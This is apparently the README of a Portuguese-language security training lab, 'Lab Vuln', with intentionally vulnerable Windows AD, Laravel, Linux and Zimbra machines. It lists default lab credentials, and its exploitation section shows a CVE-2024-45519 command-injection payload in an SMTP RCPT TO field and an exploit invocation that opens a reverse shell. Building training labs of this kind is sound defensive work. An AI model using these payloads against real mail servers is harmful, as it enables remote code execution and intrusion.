# Lab Vuln - Ambiente de Treinamento de Segurança

## Visão Geral

Lab Vuln é um ambiente de treinamento de segurança projetado para educação em cibersegurança e prática hands-on. O laboratório inclui máquinas vulneráveis configuradas intencionalmente para treinamento em detecção de ataques, análise de logs e técnicas de penetração.

## Arquitetura

O ambiente do laboratório consiste em:

- **MAQ-1**: Windows Server 2022 Domain Controller com Active Directory vulnerável
- **MAQ-2**: Aplicação web Laravel com falhas de segurança intencionais
- **MAQ-3**: Infraestrutura Linux com configurações vulneráveis
- **MAQ-4**: Zimbra Collaboration Suite vulnerável à CVE-2024-45519 (RCE via SMTP)

## Início Rápido

### 1. Pré-requisitos

```bash
# Instalar Docker e Docker Compose
sudo apt update
sudo apt install docker.io docker-compose

# Adicionar usuário ao grupo docker
sudo usermod -aG docker $USER

# Reiniciar sessão ou executar
newgrp docker
```

### 2. Deploy dos Laboratórios

#### MAQ-1 (Windows Server 2022 DC)

```bash
cd MAQ-1
./maquina1-setup.sh deploy
```

#### MAQ-2 (Laravel)

```bash
cd MAQ-2
./maquina2-setup.sh deploy
```

#### MAQ-3 (Linux)

```bash
cd MAQ-3
./maquina3-setup.sh deploy
```

#### MAQ-4 (Zimbra CVE-2024-45519)

```bash
cd MAQ-4
./maquina4-setup.sh deploy
```

### 3. Verificar Status

```bash
# Status MAQ-1
cd MAQ-1 && ./maquina1-setup.sh status

# Status MAQ-2
cd MAQ-2 && ./maquina2-setup.sh status

# Status MAQ-3
cd MAQ-3 && ./maquina3-setup.sh status

# Status MAQ-4
cd MAQ-4 && ./maquina4-setup.sh status
```

## Componentes

### MAQ-1 (Windows Server 2022 Domain Controller)

**Descrição**: Servidor Windows Server 2022 configurado como Domain Controller com Active Directory vulnerável para treinamento em segurança de infraestrutura Windows.

**Funcionalidades**:

- Windows Server 2022 Standard Edition
- Active Directory Domain Services (AD DS)
- DNS Server configurado
- Group Policy Objects (GPO)
- Usuários e grupos de teste
- Auditoria detalhada habilitada

**Vulnerabilidades Configuradas**:

- UAC (User Account Control) desabilitado
- Políticas de senha permissivas (complexidade desabilitada, mínimo 4 caracteres)
- Auditoria excessiva para gerar logs intensivos
- DNS configurado para permitir transferência de zona
- Usuários com senhas fracas e previsíveis
- Firewall configurado para serviços de domínio

**Acesso**:

- **RDP**: localhost:3389
- **Web Viewer**: http://localhost:8006
- **Credenciais**: Administrator / P@ssw0rd123!
- **Usuários de teste**: testuser / Password123!, admin / Admin123!

**Comandos Úteis**:

```bash
cd MAQ-1
./maquina1-setup.sh deploy      # Deploy completo
./maquina1-setup.sh status      # Status dos serviços
./maquina1-setup.sh logs        # Monitorar logs
./maquina1-setup.sh start       # Iniciar laboratório
./maquina1-setup.sh stop        # Parar laboratório
./maquina1-setup.sh restart     # Reiniciar laboratório
./maquina1-setup.sh clean       # Limpar ambiente
./maquina1-setup.sh attack-info # Informações de ataque
```

### MAQ-2 (Aplicação Web Laravel)

**Descrição**: Sistema de vagas para estágio desenvolvido em Laravel com vulnerabilidades intencionais para treinamento.

**Funcionalidades**:

- Aplicação web completa com AdminLTE
- Sistema de usuários e permissões
- Gestão de vagas e candidatos
- Upload de arquivos vulnerável
- Logs expostos para análise

**Vulnerabilidades Configuradas**:

- Debug mode ativado
- Upload de arquivos sem validação adequada
- Container Docker com privilégios elevados
- Docker socket exposto para escape de container
- Logs detalhados expostos

**Acesso**:

- **URL**: <http://localhost:80>
- **AdminLTE**: <http://localhost:80/admin>
- **Credenciais**: <admin@alfestagios.com> / password

**Comandos Úteis**:

```bash
cd MAQ-2
./maquina2-setup.sh deploy      # Deploy completo
./maquina2-setup.sh status      # Status dos serviços
./maquina2-setup.sh logs        # Monitorar logs
./maquina2-setup.sh shell       # Acessar shell
./attack-test.sh                # Testar ataques
./container-escape-demo.sh      # Demonstração de escape
```

### MAQ-3 (Infraestrutura Linux)

**Descrição**: Servidor Linux com serviços configurados de forma vulnerável para treinamento em segurança.

**Serviços Disponíveis**:

- SSH (porta 2222)
- FTP (porta 2121)
- Samba (porta 139, 445)
- HTTP (porta 8080)

**Vulnerabilidades Configuradas**:

- Senhas fracas e conhecidas
- Acesso anônimo ao FTP
- Compartilhamentos Samba públicos
- Container Docker com privilégios elevados
- Docker socket exposto para escape de container
- Capabilities perigosas ativadas

**Credenciais Padrão**:

- **Root**: root / root123
- **FTP**: ftpuser / password123
- **Samba**: smbuser / password123

**Comandos Úteis**:

```bash
cd MAQ-3
./maquina3-setup.sh deploy      # Deploy completo
./maquina3-setup.sh status      # Status dos serviços
./maquina3-setup.sh logs        # Monitorar logs
./maquina3-setup.sh shell       # Acessar shell
./attack-test.sh                # Testar ataques
./container-escape-demo.sh      # Demonstração de escape
```

### MAQ-4 (Zimbra CVE-2024-45519)

**Descrição**: Servidor Zimbra Collaboration Suite 8.8.15 vulnerável à CVE-2024-45519, uma vulnerabilidade crítica de Remote Code Execution (RCE) via SMTP.

**Funcionalidades**:

- Zimbra Collaboration Suite 8.8.15 GA
- Servidor SMTP vulnerável (porta 25)
- Interface web Zimbra (HTTP/HTTPS)
- Console administrativo
- Serviços de correio (POP3, IMAP, SMTP)
- Backdoor stealth integrado para demonstração

**Vulnerabilidades Configuradas**:

- **CVE-2024-45519**: RCE via injeção de comandos no SMTP
- Expansão de shell em campos RCPT TO
- Execução de comandos como usuário zimbra
- Backdoor stealth em `/usr/local/lib/systemd/system/.systemd-udevd`
- Monitoramento automático via cron jobs

**Acesso**:

- **SMTP**: localhost:25 (vulnerável)
- **Interface Web**: http://localhost:80, https://localhost:443
- **Admin Console**: https://localhost:7071
- **SSH**: localhost:22
- **Credenciais**: root / zimbra123, analyst / password123

**Comandos Úteis**:

```bash
cd MAQ-4
./maquina4-setup.sh deploy      # Deploy completo
./maquina4-setup.sh status      # Status dos serviços
./maquina4-setup.sh stop        # Parar laboratório
./maquina4-setup.sh clean       # Limpar ambiente
```

**Exploração**:

```bash
# Teste manual via telnet
telnet 127.0.0.1 25
RCPT TO: <"aabbb$(whoami)@test.com">

# Exploit automatizado
cd CVE-2024-45519
python3 exploit.py 127.0.0.1 -p 25 -lh IP_EXTERNO -lp 4444
```

## Logs e Monitoramento

### Logs Expostos para Análise

**MAQ-1**:

- Sistema: Windows Event Logs (Security, System, Application)
- Active Directory: Logs de auditoria detalhada
- DNS: Logs de consultas e transferências
- Elastic: Logs estruturados em `C:\oem\elastic-logs.txt`
- Status: `C:\oem\dc-status.txt` e `C:\oem\lab-config.txt`

**MAQ-2**:

- Sistema: `logs/system/`
- Laravel: `logs/laravel/`
- PHP: `logs/php/`
- MySQL: `logs/mysql/`
- Redis: `logs/redis/`
- Nginx: `logs/nginx/`

**MAQ-3**:

- Sistema: `logs/system/`
- SSH: `logs/ssh/`
- FTP: `logs/ftp/`
- Samba: `logs/samba/`
- Aplicação: `logs/app/`
- Comandos: `logs/commands/`

**MAQ-4**:

- Sistema: Logs do container Docker
- Zimbra: Logs de instalação e serviços
- SMTP: Logs de conexões e comandos
- Backdoor: Logs de execução de comandos
- Cron: Logs de monitoramento automático

### Coleta de Logs

Os logs são expostos via volumes Docker para permitir coleta por agentes de monitoramento externos (Elastic, Logstash, etc.).

## Cenários de Treinamento

### Ataques de Infraestrutura Windows (MAQ-1)

- Brute Force em contas de usuário
- Exploitação de políticas de senha fracas
- Ataques de enumeração de Active Directory
- DNS Zone Transfer attacks
- Kerberoasting e ataques de autenticação
- Análise de logs de auditoria Windows
- Exploitação de configurações de GPO

### Ataques Web (MAQ-2)

- SQL Injection
- Cross-Site Scripting (XSS)
- Local File Inclusion (LFI)
- Upload de arquivos maliciosos
- Directory Traversal
- Brute Force em formulários

### Ataques de Infraestrutura (MAQ-3)

- Brute Force SSH
- Acesso anônimo FTP
- Compartilhamentos Samba não autorizados
- Container escape via Docker socket
- Exploitação de capabilities Linux

### Ataques de Serviços de Correio (MAQ-4)

- **CVE-2024-45519**: Remote Code Execution via SMTP
- Injeção de comandos em campos SMTP
- Expansão de shell em RCPT TO
- Execução de comandos como usuário zimbra
- Obtenção de shell reverso via SMTP
- Análise de backdoors stealth
- Monitoramento de cron jobs maliciosos

### Análise de Logs

**MAQ-1 (Windows)**:
- Análise de logs de auditoria do Active Directory
- Detecção de tentativas de login e autenticação
- Monitoramento de eventos de segurança Windows
- Análise de logs DNS e transferências de zona
- Correlação de eventos de GPO e políticas

**MAQ-2 e MAQ-3 (Linux/Web)**:
- Detecção de tentativas de login
- Identificação de padrões de ataque
- Correlação de eventos
- Análise de tráfego de rede

**MAQ-4 (Zimbra)**:
- Análise de logs SMTP para detecção de payloads maliciosos
- Monitoramento de execução de comandos via backdoor
- Análise de cron jobs suspeitos
- Detecção de tentativas de RCE via CVE-2024-45519
- Correlação de eventos de rede e sistema

## Reset do Ambiente

Para múltiplas sessões de treinamento, use os scripts de reset para restaurar o ambiente ao seu estado inicial:

### Reset Completo

```bash
# MAQ-1
cd MAQ-1 && ./maquina1-setup.sh clean

# MAQ-2
cd MAQ-2 && ./maquina2-setup.sh clean

# MAQ-3
cd MAQ-3 && ./maquina3-setup.sh clean

# MAQ-4
cd MAQ-4 && ./maquina4-setup.sh clean
```

### Reset Individual

```bash
# Parar ambiente
./maquina1-setup.sh stop    # ou maquina2-setup.sh stop ou maquina3-setup.sh stop ou maquina4-setup.sh stop

# Reiniciar ambiente
./maquina1-setup.sh start   # ou maquina2-setup.sh start ou maquina3-setup.sh start ou maquina4-setup.sh start
```

## Configuração de Rede

### Endereços IP

- **MAQ-1**: 192.168.101.0/24 (rede Docker)
- **MAQ-2**: 192.168.201.0/24 (rede Docker)
- **MAQ-3**: 192.168.200.0/24 (rede Docker)
- **MAQ-4**: 192.168.104.0/24 (rede Docker)

### Portas Principais

- **MAQ-1**: 3389 (RDP), 8006 (Web Viewer), 5353 (DNS), 1389 (LDAP), 1445 (SMB)
- **MAQ-2**: 80 (HTTP), 3306 (MySQL), 6379 (Redis)
- **MAQ-3**: 2222 (SSH), 2121 (FTP), 139/445 (Samba)
- **MAQ-4**: 25 (SMTP), 80 (HTTP), 443 (HTTPS), 22 (SSH), 7071 (Admin Console)

## Considerações de Segurança

⚠️ **IMPORTANTE**: Este é um ambiente de treinamento com vulnerabilidades intencionais. **NÃO USE EM PRODUÇÃO**.

### Medidas de Segurança

- Ambiente de rede isolado
- Sem acesso à internet para máquinas vulneráveis
- Simulações de ataque controladas
- Capacidades de reset para estado limpo
- Logs expostos para treinamento de análise

### Melhores Práticas

- Use rede de treinamento dedicada
- Resets regulares do ambiente
- Monitore para acesso não autorizado
- Faça backup de dados importantes antes dos resets

## Solução de Problemas

### Problemas Comuns

#### Problemas Docker

```bash
# Verificar status Docker
sudo systemctl status docker

# Reiniciar Docker
sudo systemctl restart docker
```

#### Problemas de Rede

```bash
# Verificar redes Docker
docker network ls

# Remover redes conflitantes
docker network rm lab-network    # MAQ-1
docker network rm soc-network    # MAQ-2
docker network rm maq3-network  # MAQ-3

# MAQ-4
docker network rm lab-network    # MAQ-4
```

#### Problemas de Deploy

```bash
# Limpar ambiente
./maquina1-setup.sh clean    # ou maquina2-setup.sh clean ou maquina3-setup.sh clean

# Deploy novamente
./maquina1-setup.sh deploy   # ou maquina2-setup.sh deploy ou maquina3-setup.sh deploy
```

### Reset do Ambiente

Se o ambiente se tornar instável:

```bash
# Reset completo
./maquina1-setup.sh clean    # ou maquina2-setup.sh clean ou maquina3-setup.sh clean

# MAQ-3
./maquina3-setup.sh clean    # ou maquina3-setup.sh clean

# MAQ-4
./maquina4-setup.sh clean    # ou maquina4-setup.sh clean

# Deploy novamente
./maquina1-setup.sh deploy   # ou maquina2-setup.sh deploy ou maquina3-setup.sh deploy ou maquina4-setup.sh deploy
```

## Documentação

- [MAQ-1/README.md](MAQ-1/README.md) - Documentação completa do laboratório Windows Server 2022 DC
- [MAQ-2/README.md](MAQ-2/README.md) - Documentação completa do laboratório Laravel
- [MAQ-3/README.md](MAQ-3/README.md) - Documentação completa do laboratório Linux
- [MAQ-4/README.md](MAQ-4/README.md) - Documentação completa do laboratório Zimbra CVE-2024-45519

## Contribuindo

Para contribuir com o Lab Vuln:

1. Siga as melhores práticas de segurança
2. Teste todas as mudanças em ambiente isolado
3. Atualize a documentação
4. Inclua capacidades de reset para novos componentes
5. Mantenha o foco em vulnerabilidades para treinamento

## Licença

Este projeto é apenas para fins educacionais. Use de forma responsável e apenas em ambientes de treinamento controlados.

## Suporte

Para problemas e perguntas:

1. Verifique a seção de solução de problemas
2. Revise arquivos de log
3. Consulte a documentação específica de cada laboratório
4. Use scripts de reset se necessário

---

**Lab Vuln** - Ambiente de Treinamento de Segurança com Laboratórios MAQ-1 (Windows Server 2022 DC), MAQ-2 (Laravel), MAQ-3 (Linux) e MAQ-4 (Zimbra CVE-2024-45519)
